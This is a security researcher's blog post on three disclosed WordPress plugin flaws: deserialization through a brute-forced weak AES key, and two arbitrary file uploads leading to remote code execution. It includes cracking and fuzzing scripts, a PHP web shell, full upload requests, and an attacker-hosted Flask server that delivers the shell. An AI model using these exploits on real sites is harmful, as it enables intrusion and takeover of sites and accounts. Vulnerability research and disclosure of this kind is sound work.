---
layout: post
title: "3 Ways In: Exploiting WordPress Plugins via File Upload and Deserialization"
date: 2025-04-08T08:14:54+00:00
img_dir: "/assets/2025-04-08-expoiting-wordpress/images"
description: "In this post, I break down three real-world vulnerabilities found in WordPress plugins — from unsafe deserialization to arbitrary file upload — and show how they can lead to full compromise.Includes analysis, PoCs, and exploitation details."
tags:
- wordpress
- php
- exploit
---
![Cover]({{ page.img_dir | relative_url }}/cover.png) 


Hi , I am Martino Spagnuolo a Sorintian for just over a year and this is my first post on Dock12.

#### About Me: 

In the last 2 months I have been focusing on finding vulnerabilities on Wordpress plugins and with my colleague Paolo Elia we got more than 50 CVEs 

In this post I will show and explain some of the most interesting vulnerabilities found, I will try to explain everything in detail but for an easier understanding knowledge of PHP and Wordpress is needed 

The vulnerabilities below are : 
- [PHP Object Injection (Insecure Deserialization) via cracking an AES encryption key](#php-object-injection-insecure-deserialization-via-cracking-an-aes-encryption-key)
- [Arbitrary File Upload via base64-encoded data:image/* format](#arbitrary-file-upload-via-base64-encoded-dataimage-format)
- [Arbitrary File Upload via External Image URL and Improper Content-Type Handling](#arbitrary-file-upload-via-external-image-url-and-improper-content-type-handling)

___



<br><br>




# PHP Object Injection (Insecure Deserialization) via cracking an AES encryption key 

An insecure deserialization vulnerability was identified in the guest_ticket_login functionality of the plugin. The application decrypts and unserializes user-controlled input ($_GET['p']) using a weak AES-256-CBC key stored in the WordPress wp_options table. This key is generated using a predictable algorithm based on time() and random numbers. An attacker can brute-force the encryption key if the plugin installation timestamp is known (e.g., via the Last-Modified header), enabling arbitrary object injection and, under certain conditions, guest user account takeover.

### Analysis of vulnerable functions : 


`Apbd_wps_settings.php`
```php

    public function guest_ticket_login()
    {
        $ticket_param = rtrim(APBD_GetValue('p', ''), '/');

        if (! empty($ticket_param)) {
            $encKey = Apbd_wps_settings::GetEncryptionKey();
            $encObj = Apbd_WPS_EncryptionLib::getInstance($encKey);
            $requestParam = $encObj->decryptObj($ticket_param);

            if (! empty($requestParam->ticket_id) && ! empty($requestParam->ticket_user)) {
                $ticket = Mapbd_wps_ticket::FindBy("id", $requestParam->ticket_id);

                if (! empty($ticket) && $ticket->ticket_user == $requestParam->ticket_user) {
                    $is_guest_user = get_user_meta($ticket->ticket_user, "is_guest", true) == "Y";
                    $disable_hotlink = Apbd_wps_settings::GetModuleOption('disable_ticket_hotlink', 'N');

                    if ($is_guest_user || 'Y' !== $disable_hotlink) {
                        $ticket_link = Mapbd_wps_ticket::getTicketAdminLink($ticket);

                        if (is_user_logged_in()) {
                            wp_logout();
                        }

                        wp_clear_auth_cookie();
                        wp_set_current_user($ticket->ticket_user);
                        wp_set_auth_cookie($ticket->ticket_user);
                        wp_safe_redirect($ticket_link);
                        exit;
                    }
                }
            }
        }
    }

```

This function takes the value of the GET parameter `p` and decrypts it with `decryptObj`


`Apbd_WPS_EncryptionLib.php`
```php

class Apbd_WPS_EncryptionLib
{
    public $key = "APBDWPS";
    private $cipher = "AES-256-CBC";
    function __construct($key = "APBDWPS")
    {
        $this->key = $key;
    }
    static function getInstance($key)
    {
        return new self($key);
    }

    function encrypt($plainText, $password = '')
    {
        if (empty($password)) {
            $password = $this->key;
        }
        $plainText = rand(10, 99) . $plainText . rand(10, 99);
        $method = 'aes-256-cbc';
        $key = substr(hash('sha256', $password, true), 0, 32);
        $iv = substr(strtoupper(md5($password)), 0, 16);
        return base64_encode(openssl_encrypt($plainText, $method, $key, OPENSSL_RAW_DATA, $iv));
    }
    function decrypt($encrypted, $password = '')
    {
        if (empty($password)) {
            $password = $this->key;
        }
        $method = 'aes-256-cbc';
        $key = substr(hash('sha256', $password, true), 0, 32);
        $iv = substr(strtoupper(md5($password)), 0, 16);
        $plaintext = openssl_decrypt(base64_decode($encrypted), $method, $key, OPENSSL_RAW_DATA, $iv);
        return substr($plaintext, 2, -2);
    }

    function encryptObj($obj)
    {
        $text = serialize($obj);
        return $this->encrypt($text);
    }
    function decryptObj($ciphertext)
    {
        $text = $this->decrypt($ciphertext);
        return unserialize($text);
    }
}

```
As you can see the function `decryptObj()` , decrypts the content using the AES algorithm and the key instantiated in the `$this->key` class.

So if we knew the key we could send a serialized and encrypted malicious object which will then be deserialized

Reading the other functions in the source I noticed that the key is created and saved in “wp_options” , at the exact moment the plugin is installed or updated

```


MariaDB [wordpress]> select * from wp_options where option_name LIKE '%apbd_wps_encryption_key%';
+-----------+-------------------------+----------------------------------+----------+
| option_id | option_name             | option_value                     | autoload |
+-----------+-------------------------+----------------------------------+----------+
|       841 | apbd_wps_encryption_key | 1ea5aaa45f46e51857793f651b576cc6 | auto     |
+-----------+-------------------------+----------------------------------+----------+


```

The problem is in the function `APBD_EncryptionKey()` that generates the key , which is very weak 

`secondary_helper.php`
```php

if (! function_exists('APBD_EncryptionKey')) {
    function APBD_EncryptionKey()
    {
        return md5(rand(10, 99) . rand(10, 99) . time() . rand(10, 99));
    }
}

```


This algorithm used to generate the key becomes even weaker if we know the time when the key was created , which corresponds to the installation time of the plugin that can be deduced from the header “Last Modified" which is present in all wordpress plugins in `/wp-content/plugins/[plugin_slug]/readme.txt`


```


└─$ curl -v http://127.0.0.1:8080/wp-content/plugins/REDACTED/readme.txt
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET /wp-content/plugins/REDACTED/readme.txt HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.10.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 13 Mar 2025 07:59:05 GMT
< Server: Apache/2.4.62 (Debian)
< Last-Modified: Wed, 12 Mar 2025 15:52:40 GMT
< ETag: "5ad8-6302731f4d5d8"
< Accept-Ranges: bytes
< Content-Length: 23256
< Vary: Accept-Encoding
< Content-Type: text/plain
< 
=== REDACTED ===
Contributors: REDACTED
Author link: REDACTED
Tags: REDACTED
Requires at least: 5.0
Tested up to: 6.7
Requires PHP: 7.2
Stable tag: 1.4.11
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

```

From the response we can infer that the plugin was installed about the `Wed, 12 Mar 2025 15:52:40 GMT` 

Now knowing the time , we can calculate all the possible combinations by inserting a tolerance of +-10 seconds in the timestamp we have about 25 million combinations that with some time and patience we can use to fuzz the parameter “p”

**Practical examples** 

I wrote a python script to demonstrate the weakness of the algorithm that generates the key , the script simply tries to crack an md5 in this case I used the key taken from the db 'wp_options'

```python

import hashlib
import time
from datetime import datetime, timezone

# Target hash to find
target_hash = "1ea5aaa45f46e51857793f651b576cc6" # Taken from the wp_options db 

# Convert the given date to a Unix timestamp
target_dt = datetime(2025, 3, 12, 15, 52, 40, tzinfo=timezone.utc) # Taken from the header Last-Modified: Wed, 12 Mar 2025 15:52:40 GMT
target_timestamp = int(target_dt.timestamp())

# Define the interval of ±10 seconds around the target timestamp
start_time = target_timestamp - 10
end_time = target_timestamp + 10

print("Starting search...")

found = False
attempts = 0

# Record the start time
start = time.time()

# Iterate over all possible timestamps in the interval
for t in range(start_time, end_time + 1):
    # Iterate over the three random numbers (from 10 to 99 inclusive)
    for r1 in range(10, 100):
        for r2 in range(10, 100):
            for r3 in range(10, 100):
                attempts += 1
                # Create the string by concatenating the values
                s = f"{r1}{r2}{t}{r3}"
                # Calculate the MD5 of the string
                h = hashlib.md5(s.encode()).hexdigest()
                # If the hash matches the target hash, print the details
                if h == target_hash:
                    print(f"Found! r1={r1}, r2={r2}, timestamp={t}, r3={r3} => string: {s}")
                    found = True
                    break
            if found:
                break
        if found:
            break
    if found:
        break

# Record the end time and calculate the total time
end = time.time()
total_time = end - start

if not found:
    print("No combination found.")

print(f"Total attempts: {attempts}")
print(f"Time taken: {total_time:.2f} seconds")

```

This is the result : 

```

Starting search...
Found! r1=73, r2=78, timestamp=1741794767, r3=77 => string: 7378174179476777
Total attempts: 12909488
Time taken: 20.85 seconds

```

As can be seen from the result the timestamp `1741794767` used to generate the key has a difference of 7 seconds from the one read from the `Last Modified` header, and I think that this difference decreases as the power of the machine on which wordpress runs increases

So now how does the exploit materialize? 

I wrote a python script that generates all possible md5 keys and the corresponding serialized and encrypted AES object

```python

import hashlib
import time
from datetime import datetime, timezone
import base64
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def encrypt(plainText, password=''):
    # Prepend and append two random two-digit numbers
    plainText = str(random.randint(10, 99)) + plainText + str(random.randint(10, 99))
    
    # Method: aes-256-cbc (CBC)
    # Calculate the key: first 32 bytes of the SHA256 hash of the password (in binary mode)
    key = hashlib.sha256(password.encode()).digest()[:32]
    
    # Calculate the IV: first 16 characters of the MD5 string (in uppercase) of the password, converted to bytes
    iv = hashlib.md5(password.encode()).hexdigest().upper()[:16].encode()
    
    # Pad the text to reach multiples of 16 bytes (PKCS7)
    padded_text = pad(plainText.encode(), AES.block_size)
    
    # Create the cipher in CBC mode
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = cipher.encrypt(padded_text)
    
    # Encode the encrypted result in base64
    encrypted_b64 = base64.b64encode(encrypted_bytes).decode()
    return encrypted_b64

def decrypt(encrypted, password=''):
    # Calculate the key and IV in the same way as in the encrypt function
    key = hashlib.sha256(password.encode()).digest()[:32]
    iv = hashlib.md5(password.encode()).hexdigest().upper()[:16].encode()
    
    # Decode the encrypted text from base64
    encrypted_bytes = base64.b64decode(encrypted)
    
    # Create the cipher and decrypt the text
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted_bytes)
    
    # Remove the PKCS7 padding
    decrypted_text = unpad(decrypted_padded, AES.block_size).decode()
    
    # Remove the first 2 and the last 2 characters (the random numbers)
    return decrypted_text[2:-2]



serialized_obj = 'O:13:"WP_HTML_Token":2:{s:10:"on_destroy";s:6:"system";s:13:"bookmark_name";s:6:"ls -la";}'
# Convert the given date to a Unix timestamp
target_dt = datetime(2025, 3, 12, 15, 52, 40, tzinfo=timezone.utc)
target_timestamp = int(target_dt.timestamp())

# Define the interval of ±10 seconds around the target timestamp
start_timestamp = target_timestamp - 10
end_timestamp = target_timestamp + 10

print("Starting search...")

found = False
attempts = 0

# Record the start time
start_time = time.time()

with open("hashes.txt", "w") as file:
    # Iterate over all possible timestamps in the interval
    for t in range(start_timestamp, end_timestamp + 1):
        # Iterate over the random numbers: r1, r2, and r3 (from 10 to 99 inclusive)
        for r1 in range(10, 100):
            for r2 in range(10, 100):
                for r3 in range(10, 100):
                    attempts += 1
                    # Build the string by concatenating the values
                    s = f"{r1}{r2}{t}{r3}"
                    # Calculate the MD5 of the string
                    h = hashlib.md5(s.encode()).hexdigest()
                    encrypted = encrypt(serialized_obj, h)
                    # Write the combination and the hash to the file
                    file.write(f"{encrypted} {h}\n")

# Record the end time and calculate the total time
end_time = time.time()
total_time = end_time - start_time

print(f"Total payloads written: {attempts}")
print(f"Time taken: {total_time:.2f} seconds")

```

This script produces a wordlist file listing all possible payloads and md5 keys in this format : 
`PAYLOAD MD5_KEY`

In the script, this serialized object is used : `O:13:"WP_HTML_Token":2:{s:10:"on_destroy";s:6:"system";s:13:"bookmark_name";s:6:"ls -la";}` because if the encryption key is correct and the object is deserialized it will raise an exception.

`WP_HTML_Token` is a wp-core class that if it is deserialized raises an exception and the response will have status code 500


`/WordPress-6.7.1/wp-includes/html-api/class-wp-html-token.php:107`
```php

	/**
	 * Destructor.
	 *
	 * @since 6.4.0
	 */
	public function __destruct() {
		if ( is_callable( $this->on_destroy ) ) {
			call_user_func( $this->on_destroy, $this->bookmark_name ); 'system','whoami'
		}
	}

	/**
	 * Wakeup magic method.
	 *
	 * @since 6.4.2
	 */
	public function __wakeup() {
		throw new \LogicException( __CLASS__ . ' should never be unserialized' );
	}

```

so we can use this error as a confirmation that the sent payload was encrypted correctly 

To fuzz the payloads I wrote another python script (but I think with tools like ffuf , wfuzz or hydra they can be much faster and perform much better )
This script reads the previously generated wordlist and sends GET requests until it finds the correct one that responds with status code 500

```python

import asyncio
import aiohttp
import urllib.parse

URL_TEMPLATE = "http://192.168.1.20:8080/biglietto/?sgnix=true&p={}"
HEADERS = {
    "Host": "192.168.1.20:8080",
    "Accept-Language": "it-IT,it;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br"
}

# Global event to stop the process in case of a 500 status code
stop_event = asyncio.Event()

# Variables for tracking progress
completed = 0
total_payload = 0

async def worker(queue, session):
    global completed
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break
        payload, md5_value = item
        if stop_event.is_set():
            queue.task_done()
            continue

        # URL-encode the payload and build the URL
        encoded_payload = urllib.parse.quote(payload)
        url = URL_TEMPLATE.format(encoded_payload)

        try:
            async with session.get(url, headers=HEADERS) as response:
                status = response.status
                # print(f"Payload: {payload} | MD5: {md5_value} | Status: {status}")
                if status == 500:
                    print(f"Status 500 triggered by payload: {payload} with MD5: {md5_value}")
                    stop_event.set()
        except Exception as e:
            print(f"Error for payload {payload} (MD5: {md5_value}): {e}")
        queue.task_done()

        completed += 1
        # Update progress every 100 requests or at the end
        if completed % 100 == 0 or completed == total_payload:
            print(f"{completed}/{total_payload}")

async def main():
    # Queue with a limit to avoid loading too much into memory
    queue = asyncio.Queue(maxsize=1000)
    concurrency = 20

    async with aiohttp.ClientSession() as session:
        # Start the workers
        workers = [asyncio.create_task(worker(queue, session)) for _ in range(concurrency)]
        
        # Open the file and add payloads (with MD5) to the queue
        with open("hashes.txt", "r") as f:
            for i, line in enumerate(f, 1):
                if i < DEBUG_START_LINE:
                    continue
                line = line.strip()
                if not line:
                    continue
                # Assume each line is "PAYLOAD MD5" separated by a space
                parts = line.split()
                if len(parts) < 2:
                    continue
                payload = parts[0]
                md5_value = parts[1]
                await queue.put((payload, md5_value))
                if stop_event.is_set():
                    break
        
        # Send a termination signal (None) for each worker
        for _ in range(concurrency):
            await queue.put(None)
        
        # Wait until the queue is empty and the workers finish
        await queue.join()
        for w in workers:
            await w

if __name__ == '__main__':
    # Set the starting line for debugging (for production, set to 1)
    DEBUG_START_LINE = 1  # For example, for debugging you might use 1000
    print(f"DEBUG_START_LINE set to: {DEBUG_START_LINE}")

    # Count the total number of payloads to process starting from DEBUG_START_LINE
    with open("hashes.txt", "r") as f:
        total_payload = sum(1 for i, _ in enumerate(f, 1) if i >= DEBUG_START_LINE)
    print(f"Total payloads to process: {total_payload}")

    asyncio.run(main())

```

The result should look like this : 

```

DEBUG_START_LINE set to: 12908000
Total payloads to process: 2401001
100/2401001
200/2401001
300/2401001
400/2401001
500/2401001
600/2401001
700/2401001
800/2401001
900/2401001
1000/2401001
1100/2401001
1200/2401001
1300/2401001
1400/2401001
Status 500 triggered by payload: LbP22PDdjW/nEKRPpW0ML6h68Qu5HY/j4zM/GrOcQ/IlZKqT386kmLzPEMenFJxkoZIhnvG6bHXLyOV15Z7k8hH0HOVutwsJICyChqmSCxJyE+gJ1Lg12KGL3J3OUhHr with MD5: 1ea5aaa45f46e51857793f651b576cc6

```

Since I already knew the location of my payload I added a flag for debugging purposes indicating the wordlist line from which to start , the correct payload in my case was at about the 12909000th position.

And as you can see from the result the md5 key returned is the same as in the database `wp_options` , so now that we have the md5 key we can serialize and encrypt any malicious php object 

Unfortunately the in the plugin source there are no magic methods or interesting gadgets that allow to evalute the vuln to RCE or anything else 

But you could have an account takeover of a user who has set the `is_guest` meta by sending a serialized array containing the id of a ticket and if that ticket is tied to a user who has the meta set `is_guest` , it will automatically login with that user

```php

    public function guest_ticket_login()
    {
        $ticket_param = rtrim(APBD_GetValue('p', ''), '/');

        if (! empty($ticket_param)) {
            $encKey = Apbd_wps_settings::GetEncryptionKey();
            $encObj = Apbd_WPS_EncryptionLib::getInstance($encKey);
            $requestParam = $encObj->decryptObj($ticket_param);

            if (! empty($requestParam->ticket_id) && ! empty($requestParam->ticket_user)) {
                $ticket = Mapbd_wps_ticket::FindBy("id", $requestParam->ticket_id);

                if (! empty($ticket) && $ticket->ticket_user == $requestParam->ticket_user) {
                    $is_guest_user = get_user_meta($ticket->ticket_user, "is_guest", true) == "Y"; // AT THIS POINT
                    $disable_hotlink = Apbd_wps_settings::GetModuleOption('disable_ticket_hotlink', 'N');

                    if ($is_guest_user || 'Y' !== $disable_hotlink) { // AT THIS POINT
                        $ticket_link = Mapbd_wps_ticket::getTicketAdminLink($ticket);

                        if (is_user_logged_in()) {
                            wp_logout();
                        }

                        wp_clear_auth_cookie(); // AT THIS POINT
                        wp_set_current_user($ticket->ticket_user); // AT THIS POINT
                        wp_set_auth_cookie($ticket->ticket_user); // AT THIS POINT
                        wp_safe_redirect($ticket_link);
                        exit;
                    }
                }
            }
        }
    }

```

___

# Arbitrary File Upload via base64-encoded data:image/* format


While analyzing the plugin, I discovered a critical vulnerability that allows arbitrary file uploads, including `.php` files, by abusing a base64-encoded `data:image/*` payload. The root of the issue lies in the `store_final_product_image()` function, located in `staggs-functions.php`.

This function is triggered through the `staggs_get_configuration_form_urls_ajax()` AJAX handler, which is registered for both authenticated and unauthenticated users via the `wp_ajax_` and `wp_ajax_nopriv_` hooks. This means the vulnerability can be exploited remotely without authentication.

The `staggs_get_configuration_form_urls_ajax()` function handles various POST parameters, including `image_id` and `image`. When an image is provided, it directly calls `store_final_product_image()`:

```php
if ( isset( $_POST['image_id'] ) ) {
    $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) );
    $image_url  = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true );
    $response['image_url'] = $image_url;
}
```

Inside `store_final_product_image()`, the image data is expected to be in base64 format with a `data:image/...;base64,...` prefix. The MIME type is extracted via regex and used directly as the file extension:

```php
if ( preg_match( '/^data:image\/(.*);base64,/', $data, $type ) ) {
    $data = substr( $data, strpos($data, ',') + 1 );
    $type = strtolower( $type[1] ); // ← extension is fully user-controlled
    $data = base64_decode($data);
    ...
    $filename = $imagename . '.' . $type;
    file_put_contents( $save_path . "/{$filename}", $data );
}
```

There is no validation of the actual file type, no extension whitelist, and the decoded data is blindly written to disk. This makes it possible to send a payload like `data:image//shell.php;base64,...` and have the file saved directly to `/wp-content/uploads/staggs/shell.php`.

To demonstrate the issue, I created a simple PHP backdoor:

```php
<?php system($_GET['cmd']); ?>
```

This code, once base64-encoded, was used in the following HTTP POST request to upload the file via the vulnerable AJAX endpoint:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

action=staggs_get_configuration_form_urls&contents={}&image_id=test&image=data:image//test.php;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2bIA%3d%3d
```

The base64 string decodes to the PHP code shown above.

After sending the request, the file is saved at:

```
http://example.com/wp-content/uploads/staggs/test.php
```

At this point, it is possible to achieve Remote Code Execution (RCE) by accessing the file with a `cmd` parameter, such as:

```
http://example.com/wp-content/uploads/staggs/test.php?cmd=id
```

This exploit works because:
- the file extension is derived from the user-supplied MIME type,
- there is no verification of the decoded file content,
- there is no restriction on dangerous extensions (like `.php`),
- and the file is saved in a web-accessible directory.

___

# Arbitrary File Upload via External Image URL and Improper Content-Type Handling


While analyzing the user profile handling mechanism of a WordPress plugin, I discovered a vulnerability that allows an attacker to upload arbitrary files to the server simply by providing a crafted external URL. This flaw originates from a function responsible for downloading and storing avatar images set by users when updating their profile. The vulnerability is exploitable by any authenticated user who has access to the profile update page (`/wp-admin/profile.php`), which includes by default all logged...

The plugin adds a custom field to the profile form where users can specify a remote image URL (`avatar_url`). When the form is submitted, the plugin processes the URL using the vulnerable function `save_social_avatar()`, which attempts to download and save the remote resource as the user's new avatar image.

Let’s walk through the vulnerable function:

```php
private function save_social_avatar( $url = NULL, $name = 'avatar' ) {
    
    $url = stripslashes( $url );
    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
        return false;
    }
    if ( empty( $name ) ) {
        $name = basename( $url );
    }

    $dir = wp_upload_dir();

    try {
        $image = wp_remote_get( $url, array( 'timeout' => 15 ) );
        if ( ! is_wp_error( $image ) && isset( $image['response']['code'] ) && 200 === $image['response']['code'] ) {
            
            $image_content = wp_remote_retrieve_body( $image );
            $image_type = isset( $image['headers'] ) && isset( $image['headers']['content-type'] ) ? $image['headers']['content-type'] : '';
            $image_type_parts = array();
            $extension = '';

            if ( $image_type ) {
                $image_type_parts = explode( '/', $image_type );
                $extension = $image_type_parts[1];
            }

            if ( ! is_string( $image_content ) || empty( $image_content ) ) {
                return false;
            }

            if ( ! is_dir( $dir['basedir'] . '/[REDACTED]' ) ) {
                wp_mkdir_p( $dir['basedir'] . '/[REDACTED]' );
            }

            $save = file_put_contents( $dir['basedir'] . '/[REDACTED]/' . $name . '.' . $extension, $image_content );
            if ( ! $save ) {
                return false;
            }

            return $dir['baseurl'] . '/[REDACTED]/' . $name . '.' . $extension;
        }

        return false;

    } catch ( Exception $e ) {
        return false;
    }
}
```

This function accepts a user-provided `$url`, which is fetched using `wp_remote_get()`. If the response is successful, the body of the response is retrieved and stored as a file on disk. The filename is constructed using the original basename of the URL and the file extension is determined based on the `Content-Type` header of the remote response. This introduces a critical flaw: the attacker controls both the contents of the file and the extension, via the remote server.

There is no verification of the actual content type, no restriction on allowed MIME types, and no server-side validation of the file contents. As a result, an attacker can host a malicious server and serve a file like this:

```php
<?php system($_GET['cmd']); ?>
```

...along with a `Content-Type: image/php` header. Since the function blindly splits the content type and extracts the second part as the extension (`php`), the file will be saved as something like:

```
/wp-content/uploads/[REDACTED]/avatar.php
```

To test this, I hosted a minimal Flask server with the following code:

```python
from flask import Flask, Response

app = Flask(__name__)

@app.route('/testimage.png', methods=['GET'])
def test_image():
    response = Response("<?php system($_GET['cmd']); ?>")
    response.headers["Content-Type"] = "image/php"
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
```

Then I updated the avatar field in the WordPress profile form with the following URL:

```
http://<attacker-server>/testimage.png
```

Once the profile was saved, the plugin downloaded the file, interpreted the `Content-Type: image/php`, and wrote the PHP payload with a `.php` extension in the uploads folder. The result was a web-accessible file that could be used to execute arbitrary system commands via a simple request like:

```
http://target-site.com/wp-content/uploads/[REDACTED]/avatar.php?cmd=id
```

This effectively results in **Remote Code Execution** via a file upload vector, achievable from a low-privileged authenticated user context. The vulnerability exists due to a lack of MIME validation, unfiltered reliance on the `Content-Type` header, and the use of uncontrolled input for determining file extensions.
